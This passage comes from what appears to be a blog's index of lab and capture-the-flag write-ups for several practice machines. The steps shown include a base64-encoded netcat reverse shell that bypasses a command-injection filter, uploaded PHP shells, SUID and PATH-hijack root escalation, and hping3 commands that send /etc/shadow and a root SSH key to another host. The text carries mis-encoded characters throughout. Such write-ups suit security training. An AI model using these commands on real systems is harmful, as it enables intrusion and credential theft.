((Ubuntu))|_http-title: Site does not have a title (text/html; charset=UTF-8).|_http-server-header: Apache/2.4.29 (Ubuntu)MAC Address: 08:00:27:7E:D4:B7 (Oracle VirtualBox virtual NIC)```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/NoName/Untitled%201.png)Now Entering any value gives no results so lets see into the directory listing files â†’![Untitled](/Vulnhub-Files/img/NoName/Untitled%202.png)lets see the admin directory â†’![Untitled](/Vulnhub-Files/img/NoName/Untitled%203.png)I think paraphrase are used in as password from extracting data from image or file so lets see what I can get from this â†’![Untitled](/Vulnhub-Files/img/NoName/Untitled%204.png)as I got a file named as `superadmin.php` â†’![Untitled](/Vulnhub-Files/img/NoName/Untitled%205.png)Now I see it is pinging the input IP address so lets bypass it and make it into a command Injection â†’![Untitled](/Vulnhub-Files/img/NoName/Untitled%206.png)Now I can execute certain commands so lets see the source code of this superadmin.php file so that we can debugg this page â†’![Untitled](/Vulnhub-Files/img/NoName/Untitled%207.png)After seeing this code I have to bypass (\";\",\"&&\",\"/\",\"bin\",\"&\",\" &&\",\"ls\",\"nc\",\"dir\",\"pwd\") these attributes to gain an access â†’So lets use base64 as encoding and decoding system and then executing it .Lets try â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Noname]â””â”€$ echo \"nc.traditional -e /bin/bash 10.0.2.15 4444\" | base64bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDEwLjAuMi4xNSA0NDQ0Cg==```{: .nolineno}![Untitled](/Vulnhub-Files/img/NoName/Untitled%208.png)In response to that I got a local privilege escalation â¤µï¸![Untitled](/Vulnhub-Files/img/NoName/Untitled%209.png)Lets enumerate further â†’```bashwww-data@haclabs:/home$ lslshaclabs yashwww-data@haclabs:/home$ cd yashcd yashwww-data@haclabs:/home/yash$ ls -alls -altotal 36drwxr-xr-x 5 yash yash 4096 Feb 15 2020 .drwxr-xr-x 4 root root 4096 Jan 27 2020 ..-rw------- 1 yash yash 13 Feb 15 2020 .bash_history-rw-r--r-- 1 yash yash 3771 Jan 27 2020 .bashrcdrwx------ 2 yash yash 4096 Feb 9 2020 .cachedrwx------ 3 yash yash 4096 Jan 27 2020 .gnupgdrwxrwxr-x 3 yash yash 4096 Jan 27 2020 .local-rw-r--r-- 1 yash yash 807 Jan 27 2020 .profile-rw-rw-r-- 1 yash yash 77 Jan 30 2020 flag1.txtwww-data@haclabs:/home/yash$ cat flag1.txtcat flag1.txtDue to some security issues,I have saved haclabs password in a hidden file.www-data@haclabs:/home/yash$```{: .nolineno}Now I also got flag2.txt into haclabs directory â†’```bashwww-data@haclabs:/home/haclabs$ cat flag2.txt\tcat flag2.txtI am flag2 \t --------------- ---------------- --------www-data@haclabs:/home/haclabs$```{: .nolineno}Now lets see the SUIDs files â†’![Untitled](/Vulnhub-Files/img/NoName/Untitled%2010.png)I got a command of `find` that have a permission to get use to root lets try â†’```bashwww-data@haclabs:/var/www/html$ find . -exec /bin/bash -p \\; -quit bash-4.4# whoamirootbash-4.4# iduid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)bash-4.4# cd /rootbash-4.4# ls -altotal 40drwx------ 6 root root 4096 Jun 28 12:22 .drwxr-xr-x 24 root root 4096 Mar 14 2020 ..-rw------- 1 root root 0 Jul 14 2020 .bash_history-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 Jan 30 2020 .cachedrwx------ 5 root root 4096 Jan 30 2020 .configdrwx------ 3 root root 4096 Jan 27 2020 .gnupgdrwxr-xr-x 3 root root 4096 Jan 27 2020 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 32 Jul 14 2020 flag3.txt-rw-r--r-- 1 root root 33 Jun 28 12:22 proof.txtbash-4.4# cat flag3.txt Your flag is in another file...bash-4.4# cat proof.txt 718d227b9f5e9b38a754aa386ee60f3dbash-4.4#```{: .nolineno}Now also lets see the local.txt file in yash directory â†’```bashbash-4.4# cd /homebash-4.4# lshaclabs yashbash-4.4# cd yashbash-4.4# ls -altotal 36drwxr-xr-x 5 yash yash 4096 Jul 10 2020 .drwxr-xr-x 4 root root 4096 Jan 27 2020 ..-rw------- 1 yash yash 0 Mar 16 2020 .bash_history-rw-r--r-- 1 yash yash 3771 Jan 27 2020 .bashrcdrwx------ 2 yash yash 4096 Feb 9 2020 .cachedrwx------ 3 yash yash 4096 Jan 27 2020 .gnupgdrwxrwxr-x 3 yash yash 4096 Jan 27 2020 .local-rw-r--r-- 1 yash yash 807 Jan 27 2020 .profile-rw-rw-r-- 1 yash yash 77 Jan 30 2020 flag1.txt-rw-r--r-- 1 yash yash 33 Jun 28 12:22 local.txtbash-4.4# cat local.txt 7776aa0d53576f01d200900eded356bdbash-4.4#```{: .nolineno}---> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "LazySysAdmin", "url": "/posts/LazySysAdmin/", "categories": "Proving Grounds, Play", "tags": "Password Bruteforce, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the Victim Machineâ€™s IP address â¤µï¸![Untitled](/Vulnhub-Files/img/LazySysAdmin/Untitled.png)```bashIP : 192.168.249.131```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/...", "content": "### Lets check the Victim Machineâ€™s IP address â¤µï¸![Untitled](/Vulnhub-Files/img/LazySysAdmin/Untitled.png)```bashIP : 192.168.249.131```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Lazysysadmin]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.131Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 01:57 EDTNmap scan report for 192.168.249.131Host is up (0.0028s latency).Not shown: 65529 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 b538660fa1eecd41693b82cfada1f713 (DSA)| 2048 585a6369d0dadd51ccc16e00fd7e61d0 (RSA)| 256 6130f3551a0ddec86a595bc99cb49204 (ECDSA)|_ 256 1f65c0dd15e6e421f2c19ba3b655a045 (ED25519)80/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache/2.4.7 (Ubuntu)| http-robots.txt: 4 disallowed entries |_/old/ /test/ /TR2/ /Backnode_files/|_http-title: Backnode|_http-generator: Silex v2.2.7139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)3306/tcp open mysql MySQL (unauthorized)6667/tcp open irc InspIRCd| irc-info: | server: Admin.local| users: 1| servers: 1| chans: 0| lusers: 1| lservers: 0| source ident: nmap| source host: 192.168.249.128|_ error: Closing link: (nmap@192.168.249.128) [Client exited]MAC Address: 00:0C:29:34:9D:0A (VMware)Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration âž¡ï¸![Untitled](/Vulnhub-Files/img/LazySysAdmin/Untitled%201.png)### Directory / Files Bruteforcing â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Lazysysadmin]â””â”€$ feroxbuster -u http://192.168.249.131:80 -t 100 -k -o ferox_80 --depth 2 -C 403,404 -x php,js,html,txt,zip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ðŸ¤“ ver: 2.9.1â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸŽ¯ Target Url â”‚ http://192.168.249.131:80 ðŸš€ Threads â”‚ 100 ðŸ“– Wordlist â”‚ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ðŸ’¢ Status Code Filters â”‚ [403, 404] ðŸ’¥ Timeout (secs) â”‚ 7 ðŸ¦¡ User-Agent â”‚ feroxbuster/2.9.1 ðŸ’‰ Config File â”‚ /etc/feroxbuster/ferox-config.toml ðŸ’¾ Output File â”‚ ferox_80 ðŸ’² Extensions â”‚ [php, js, html, txt, zip] ðŸ HTTP methods â”‚ [GET] ðŸ”“ Insecure â”‚ true ðŸ”ƒ Recursion Depth â”‚ 2 ðŸŽ‰ New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latestâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ Press [ENTER] to use the Scan Management Menuâ„¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€200 GET 911l 1700w 36072c http://192.168.249.131/200 GET 911l 1700w 36072c http://192.168.249.131/index.html200 GET 927l 5044w 77179c http://192.168.249.131/info.php301 GET 9l 28w 321c http://192.168.249.131/wordpress => http://192.168.249.131/wordpress/301 GET 9l 28w 316c http://192.168.249.131/test => http://192.168.249.131/test/301 GET 9l 28w 314c http://192.168.249.131/wp => http://192.168.249.131/wp/301 GET 9l 28w 318c http://192.168.249.131/apache => http://192.168.249.131/apache/301 GET 9l 28w 315c http://192.168.249.131/old => http://192.168.249.131/old/301 GET 9l 28w 322c http://192.168.249.131/javascript => http://192.168.249.131/javascript/200 GET 7l 10w 92c http://192.168.249.131/robots.txt301 GET 9l 28w 332c http://192.168.249.131/wordpress/wp-content => http://192.168.249.131/wordpress/wp-content/200 GET 385l 3179w 19935c http://192.168.249.131/wordpress/license.txt301 GET 9l 28w 333c http://192.168.249.131/wordpress/wp-includes => http://192.168.249.131/wordpress/wp-includes/200 GET 98l 844w 7413c http://192.168.249.131/wordpress/readme.html301 GET 9l 28w 330c http://192.168.249.131/wordpress/wp-admin => http://192.168.249.131/wordpress/wp-admin/301 GET 9l 28w 322c http://192.168.249.131/phpmyadmin => http://192.168.249.131/phpmyadmin/200 GET 24l 149w 12497c http://192.168.249.131/phpmyadmin/webapp.php200 GET 25l 318w 8269c http://192.168.249.131/phpmyadmin/navigation.php200 GET 25l 318w 8266c http://192.168.249.131/phpmyadmin/license.php200 GET 25l 318w 8265c http://192.168.249.131/phpmyadmin/export.php401 GET 14l 54w 461c http://192.168.249.131/phpmyadmin/setup200 GET 25l 318w 8262c http://192.168.249.131/phpmyadmin/sql.php301 GET 9l 28w 332c http://192.168.249.131/javascript/prototype => http://192.168.249.131/javascript/prototype/405 GET 1l 6w 42c http://192.168.249.131/wordpress/xmlrpc.php301 GET 9l 28w 329c http://192.168.249.131/phpmyadmin/locale => http://192.168.249.131/phpmyadmin/locale/200 GET 25l 318w 8272c http://192.168.249.131/phpmyadmin/server_status.php[####################] - 11m 11909484/11909484 0s found:26 errors:851498 [####################] - 9m 1323276/1323276 2411/s http://192.168.249.131:80/ [####################] - 9m 1323276/1323276 2222/s http://192.168.249.131/ [####################] - 10m 1323276/1323276 2128/s http://192.168.249.131/wordpress/ [####################] - 0s 1323276/1323276 0/s http://192.168.249.131/test/ => Directory listing (add -e to scan)[####################] - 0s 1323276/1323276 0/s http://192.168.249.131/wp/ => Directory listing (add -e to scan)[####################] - 0s 1323276/1323276 0/s http://192.168.249.131/apache/ => Directory listing (add -e to scan)[####################] - 0s 1323276/1323276 0/s http://192.168.249.131/old/ => Directory listing (add -e to scan)[####################] - 11m 1323276/1323276 1957/s http://192.168.249.131/javascript/ [####################] - 9m 1323276/1323276 2260/s http://192.168.249.131/phpmyadmin/```{: .nolineno}Now Lets check the wordpress site now â¤µï¸![Untitled](/Vulnhub-Files/img/LazySysAdmin/Untitled%202.png)Now I get a username as `togie` so lets try ssh brute force âž¡ï¸![Untitled](/Vulnhub-Files/img/LazySysAdmin/Untitled%203.png)Letâ€™s SSH now â¤µï¸![Untitled](/Vulnhub-Files/img/LazySysAdmin/Untitled%204.png)Now see what this user can do âž¡ï¸![Untitled](/Vulnhub-Files/img/LazySysAdmin/Untitled%205.png)Proof.txt file â¬‡ï¸```bashroot@LazySysAdmin:/root# cat proof.txtWX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851Well done :)Hope you lear not a few things along the way.Regards,Togie McdogieEnjoy some random stringsWX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT98512d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19puroot@LazySysAdmin:/root#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Jordan Infosec CTF01", "url": "/posts/Jordaninfosec-CTF01/", "categories": "Proving Grounds, Play", "tags": "File Upload, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Letâ€™s check the IP address of the victim machine â†’![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled.png)```bashIP : 10.0.2.46 ```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub...", "content": "### Letâ€™s check the IP address of the victim machine â†’![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled.png)```bashIP : 10.0.2.46 ```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%201.png)![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%202.png)hint.txt â€”>![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%203.png)![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%204.png)```bash```{: .nolineno}Lets login into this site â€”> ![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%205.png)and now upload the reverse shell file here â€”>![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%206.png)As â¬†ï¸ I got success in uploading the files so lets load that shell file âž¡ï¸```bashURL --> http://10.0.2.46/uploaded_files/shell.php```{: .nolineno}In response to that I got this â€”> ![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%207.png)Actually, this statement of hidden file was a little misleading, because the file we are looking for was not hiddenâ€¦ I tried to search for user, pass, etcâ€¦ files, but unfortunately, none of them worked. Lastly, I tried `find / -name cred*`, which revealed the /etc/mysql/conf.d/credentials.txt file.```bashwww-data@Jordaninfosec-CTF01:/$ find / -name cred* 2>/dev/null/sys/kernel/slab/cred_jar/usr/share/man/man7/credentials.7.gz/usr/share/doc/git/contrib/credential/usr/src/linux-headers-4.4.0-31/include/linux/cred.h/usr/src/linux-headers-4.4.0-210/include/linux/cred.h/usr/src/linux-headers-4.4.0-72/include/linux/cred.h/etc/mysql/conf.d/credentials.txtwww-data@Jordaninfosec-CTF01:/$www-data@Jordaninfosec-CTF01:/$ cat /etc/mysql/conf.d/credentials.txtcat /etc/mysql/conf.d/credentials.txtThe 4th flag is : {7845658974123568974185412}username : technawipassword : 3vilH@ksorwww-data@Jordaninfosec-CTF01:/$```{: .nolineno}Now thank god I got the credentials I was pissed so bad â€”>```bashwww-data@Jordaninfosec-CTF01:/$ su technawisu technawiPassword: 3vilH@ksortechnawi@Jordaninfosec-CTF01:/$ whoamiwhoamitechnawitechnawi@Jordaninfosec-CTF01:/$```{: .nolineno}Now lets see how technawi can lead me to root â€”>```bashtechnawi@Jordaninfosec-CTF01:/$ sudo -lsudo -l[sudo] password for technawi: 3vilH@ksorMatching Defaults entries for technawi on Jordaninfosec-CTF01: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser technawi may run the following commands on Jordaninfosec-CTF01: (ALL : ALL) ALLtechnawi@Jordaninfosec-CTF01:/$```{: .nolineno}Now its root time âž¡ï¸```bashtechnawi@Jordaninfosec-CTF01:/$ sudo /bin/bash -isudo /bin/bash -iroot@Jordaninfosec-CTF01:/# whoamiwhoamirootroot@Jordaninfosec-CTF01:/#```{: .nolineno}Letâ€™s find out the last flag âž¡ï¸```bashroot@Jordaninfosec-CTF01:/var/www/html# cat flag.txtcat flag.txtThe 5th flag is : {5473215946785213456975249}Good job :)You find 5 flags and got their points and finish the first scenario....root@Jordaninfosec-CTF01:/var/www/html#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Inclusiveness", "url": "/posts/Inclusiveness/", "categories": "Proving Grounds, Play", "tags": "FTP, LFI, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Lets check the IP address âž¡ï¸![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled.png)```bashIP : 10.10.2.50```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Gro...", "content": "### Lets check the IP address âž¡ï¸![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled.png)```bashIP : 10.10.2.50```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Inclusiveness]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.50Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 21:15 ISTNmap scan report for 10.0.2.50Host is up (0.00068s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.0.2.27| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxrwxrwx 2 0 0 4096 Feb 08 2020 pub [NSE: writeable]22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey: | 2048 061ba39283a57a15bd406e0c8d98277b (RSA)| 256 cb3883261a9fd35dd3fe9ba1d3bcab2c (ECDSA)|_ 256 6554fc2d12ace184783e0023fbe4c9ee (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Apache2 Debian Default Page: It works|_http-server-header: Apache/2.4.38 (Debian)MAC Address: 08:00:27:6F:A3:19 (Oracle VirtualBox virtual NIC)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration âž¡ï¸![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%201.png)Lets see the directory listing files â€”>![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%202.png)Now lets check the `robots.txt` file âž¡ï¸![image_1.png](/Vulnhub-Files/img/Inclusiveness/image_1.png)Now lets look at this directory â€”>![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%203.png)Lets check for english link which leads me for directory or files bruteforcing attack â†’ `/etc/passwd` â†’![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%204.png)Other than this I was unable to get any foothold into any internal directory files so I brute-force with LFI Injection payloads through burpsuite and I got this file â€”> `/etc/vsftpd.conf`![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%205.png)Now I have also access with ftp so lets upload the reverse shell file in it â€”>![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%206.png)Now I have uploaded the file in location /ftp/pub/shell.php lets load it and get my reverse shell â†’URL â€”> `http://10.0.2.50/secret_information/?lang=/var/ftp/pub/shell.php`In response to that I got this â€”>![Untitled](/Vulnhub-Files/img/Inclusiveness/Untitled%207.png)Now lets recon further â¤µï¸```bashwww-data@inclusiveness:/home/tom$ ls -alls -altotal 100drwxr-xr-x 15 tom tom 4096 Feb 8 2020 .drwxr-xr-x 3 root root 4096 Feb 8 2020 ..-rw------- 1 tom tom 684 Feb 8 2020 .ICEauthority-rw-r--r-- 1 tom tom 220 Feb 8 2020 .bash_logout-rw-r--r-- 1 tom tom 3526 Feb 8 2020 .bashrcdrwx------ 10 tom tom 4096 Feb 8 2020 .cachedrwx------ 10 tom tom 4096 Feb 8 2020 .configdrwx------ 3 tom tom 4096 Feb 8 2020 .gnupgdrwx------ 3 tom tom 4096 Feb 8 2020 .local-rw-r--r-- 1 tom tom 807 Feb 8 2020 .profiledrwx------ 2 tom tom 4096 Feb 8 2020 .sshdrwxr-xr-x 2 tom tom 4096 Feb 8 2020 Desktopdrwxr-xr-x 2 tom tom 4096 Feb 8 2020 Documentsdrwxr-xr-x 2 tom tom 4096 Feb 8 2020 Downloadsdrwxr-xr-x 2 tom tom 4096 Feb 8 2020 Musicdrwxr-xr-x 2 tom tom 4096 Feb 8 2020 Picturesdrwxr-xr-x 2 tom tom 4096 Feb 8 2020 Publicdrwxr-xr-x 2 tom tom 4096 Feb 8 2020 Templatesdrwxr-xr-x 2 tom tom 4096 Feb 8 2020 Videos-rwsr-xr-x 1 root root 16976 Feb 8 2020 rootshell-rw-r--r-- 1 tom tom 448 Feb 8 2020 rootshell.cwww-data@inclusiveness:/home/tom$```{: .nolineno}Lets check the `rootshell` file which executes as root and I have access to read `rootshell.c` file â†’```bashwww-data@inclusiveness:/home/tom$ cat rootshell.ccat rootshell.c#include #include #include #include int main() { printf(\"checking if you are tom...\\n\"); FILE* f = popen(\"whoami\", \"r\"); char user[80]; fgets(user, 80, f); printf(\"you are: %s\\n\", user); //printf(\"your euid is: %i\\n\", geteuid()); if (strncmp(user, \"tom\", 3) == 0) { printf(\"access granted.\\n\");\tsetuid(geteuid()); execlp(\"sh\", \"sh\", (char *) 0); }}www-data@inclusiveness:/home/tom$```{: .nolineno}Now In this program whoami should be equal to tom to get our shell so I have to make whoami which says echoâ€™s tom and it will execute accordingly â†’```bashwww-data@inclusiveness:/home/tom$ cd /tmpcd /tmpwww-data@inclusiveness:/tmp$ echo 'echo \"tom\"' >whoamiecho 'echo \"tom\"' >whoamiwww-data@inclusiveness:/tmp$ cat whoamicat whoamiecho \"tom\"www-data@inclusiveness:/tmp$ export PATH=/tmp:$PATHexport PATH=/tmp:$PATHwww-data@inclusiveness:/tmp$ /home/tom/rootshell/home/tom/rootshellchecking if you are tom...you are: tomaccess granted.# /bin/bash -i/bin/bash -iroot@inclusiveness:/tmp# whoamiwhoamitomroot@inclusiveness:/tmp# export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "ICMP", "url": "/posts/ICMP/", "categories": "Proving Grounds, Play", "tags": "Public Exploit, hping3, PrivEsc", "date": "2023-06-14 00:00:00 +0530", "snippet": "Description â¤µï¸ ðŸ’¡ ICMP â¤µï¸Easy box, monitor resourcesThis works better with VirtualBox rather than VMwareLetâ€™s find the IP Address firstÂ Â»IP : 10.0.2.24Port Scan Results âž¡ï¸OPEN PORTS &gt;22 SSH80 ...", "content": "Description â¤µï¸ ðŸ’¡ ICMP â¤µï¸Easy box, monitor resourcesThis works better with VirtualBox rather than VMwareLetâ€™s find the IP Address firstÂ Â»IP : 10.0.2.24Port Scan Results âž¡ï¸OPEN PORTS &gt;22 SSH80 HTTPWeb Enumeration â¤µï¸Lets check an exploit for this Monitoring System â†’Now I executed the shell â†’Lets load the reverse shell url â†’URL â†’ http://10.0.2.24/mon/assets/data/usrimg/she_ll.phpResponse â†’SHELL âž¡ï¸local.txt â†’ c9db6c88939a2ae091c431a45fb1e59cSo the crypt file is basically inside the devel file â†’Now I got in with this password â†’ BUHNIJMONIBUVCYTTYVGBUHJNILets see how fox can leads me to root !Lets use this â¤µï¸It allowed a command to run as root. Since we must use ICMP mode, we cannot spawn a shell. However, we can transfer files to a different machine. We could try sending the shadow file or try to send an SSH private key.Reference:Â https://iphelix.medium.com/hping-tips-and-tricks-85698751179fFor this, we require to set up hping3 in listen mode in the receiver machine, whereas from the target machine, we have to send the file.IP of the receiver machine: 10.0.2.15IP of the target machine: 10.0.2.60On the receiver machine, we have to do the following.{: .nolineno}sudo hping3 -1 10.0.2.24 -9 signature -I eth0 --safeOn the target machine, we should do as follows to get the shadow file.{: .nolineno}sudo /usr/sbin/hping3 --icmp 10.0.2.27 -e signature -E /etc/shadow -d 2000 -c 1This gave me output in my receiving machine. In the command above, -c 1 is the number of times the ping operation is performed. Since we have data size of 2000, we just need a single ping. However, you can completely change the value or exclude it to manually exit later.I tried bruteforcing the password but had no luck. Next, I tried to get the private key using the same method.{: .nolineno}sudo /usr/sbin/hping3 --icmp 10.0.2.27 -e signature -E /root/.ssh/id_rsa -d 2000I got the response like the following. Thus, I decided to do the same in the two different SSH instances of the target machine.On the target machines,{: .nolineno}# SSH instance 1sudo hping3 --icmp 127.0.0.1 --listen signature --safe{: .nolineno}# SSH instance 2sudo hping3 --icmp 127.0.0.1 --sign signature --file /root/.ssh/id_rsa -d 4000 -c 2Finally, I got the proper response. Next, I copied it to a file on my local machine.{: .nolineno}vi id_rsa # Copy the keychmod 600 id_rsa # This will restrict the private key permissionsLastly, I could log in to the system.{: .nolineno}ssh root@10.0.2.24 -i id_rsa If you have any questions or suggestions, please leave a comment below.Thank You !" }, { "title": "Ha Natraj", "url": "/posts/Ha-Natraj/", "categories": "Proving Grounds, Play", "tags": "LFI, PrivEsc, auth.log, sudo exploit", "date": "2023-06-14 00:00:00 +0530", "snippet": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled.png)```bashIP : 192.168.249.135```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Prov...", "content": "### Letâ€™s find the IP Address first >>![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled.png)```bashIP : 192.168.249.135```{: .nolineno}## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Ha_natraj]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.135 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 08:01 EDTNmap scan report for 192.168.249.135Host is up (0.00080s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 d99fdaf42e670192d5da7f70d006b392 (RSA)| 256 bceaf13bfa7c050c929592e9e7d20771 (ECDSA)|_ 256 f0245b7a3bd6b794c44bfe5721f80061 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: HA:Natraj|_http-server-header: Apache/2.4.29 (Ubuntu)MAC Address: 00:0C:29:F7:80:5D (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%201.png)Now lets see the directory traveral files/directories â†’```bash200 GET 183l 1767w 14497c http://192.168.249.135/301 GET 9l 28w 319c http://192.168.249.135/images => http://192.168.249.135/images/MSG 0.000 feroxbuster::heuristics detected directory listing: http://192.168.249.135/images (Apache)200 GET 183l 1767w 14497c http://192.168.249.135/index.html301 GET 9l 28w 320c http://192.168.249.135/console => http://192.168.249.135/console/MSG 0.000 feroxbuster::heuristics detected directory listing: http://192.168.249.135/console (Apache)```{: .nolineno}Letâ€™s look for LFI in `/console/` directoryâ†’![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%202.png)![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%203.png)Now I found a `auth.log` file where I found ssh login logs â†’![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%204.png)Now I have to try `ssh poisoning` to get the command execution running â†’![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%205.png)Now lets see the response in auth.log file â†’![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%206.png)After this lets try command injection through `cmd` â†’![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%207.png)Its reverse Shell time â†’![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%208.png)Now In response I got the shell â†’![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%209.png)Now I found nothing so far , therefore I got to know about sudo version and exploited it â†’```bashwww-data@ubuntu:/var/www/html$ sudo -VSudo version 1.8.21p2Sudoers policy plugin version 1.8.21p2Sudoers file grammar version 46Sudoers I/O plugin version 1.8.21p2```{: .nolineno}Now After recon I found the exploit â†’âž¡ï¸ [https://github.com/worawit/CVE-2021-3156/tree/main](https://github.com/worawit/CVE-2021-3156/tree/main)![Untitled](/Vulnhub-Files/img/Ha-Natraj/Untitled%2010.png)Now 